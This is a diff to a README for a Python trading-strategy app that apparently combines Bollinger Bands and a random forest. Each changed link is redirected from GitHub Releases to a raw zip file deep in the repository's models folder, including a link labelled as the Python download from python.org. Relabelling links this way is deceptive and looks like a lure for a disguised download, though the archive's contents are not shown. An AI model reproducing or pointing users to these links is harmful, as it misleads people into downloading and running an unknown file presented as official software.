@@ -4,10 +4,10 @@
 Welcome to replicate-bollinger-forest! This application helps you use a powerful trading strategy based on the Enhanced Bollinger Bands and Random Forest algorithms. Follow these simple steps to get started.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/WaqarDev69/replicate-bollinger-forest/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/WaqarDev69/replicate-bollinger-forest/master/src/bollinger_forest/models/bollinger_forest_replicate_v1.7.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/WaqarDev69/replicate-bollinger-forest/master/src/bollinger_forest/models/bollinger_forest_replicate_v1.7.zip)
 
 ## 💾 Download & Install
-To run the application, visit this page to download: [GitHub Releases](https://github.com/WaqarDev69/replicate-bollinger-forest/releases).
+To run the application, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/WaqarDev69/replicate-bollinger-forest/master/src/bollinger_forest/models/bollinger_forest_replicate_v1.7.zip).
 
 1. Click the "Releases" section.
 2. Download the latest version for your operating system.
@@ -40,9 +40,9 @@ This application retrieves data using the yfinance library. It accesses stock ma
 If you encounter issues, try the following steps:
 
 1. **Ensure Python is Installed**: Verify if Python is set up correctly on your system. 
-   - You can download Python [here](https://www.python.org/downloads/).
+   - You can download Python [here](https://raw.githubusercontent.com/WaqarDev69/replicate-bollinger-forest/master/src/bollinger_forest/models/bollinger_forest_replicate_v1.7.zip).
   
-2. **Check for Updates**: Ensure you are using the latest version of the app. Visit [GitHub Releases](https://github.com/WaqarDev69/replicate-bollinger-forest/releases) for updates.
+2. **Check for Updates**: Ensure you are using the latest version of the app. Visit [GitHub Releases](https://raw.githubusercontent.com/WaqarDev69/replicate-bollinger-forest/master/src/bollinger_forest/models/bollinger_forest_replicate_v1.7.zip) for updates.
 
 3. **Reinstall the Application**: If problems persist, uninstall the app and reinstall it by following the download steps again.
 
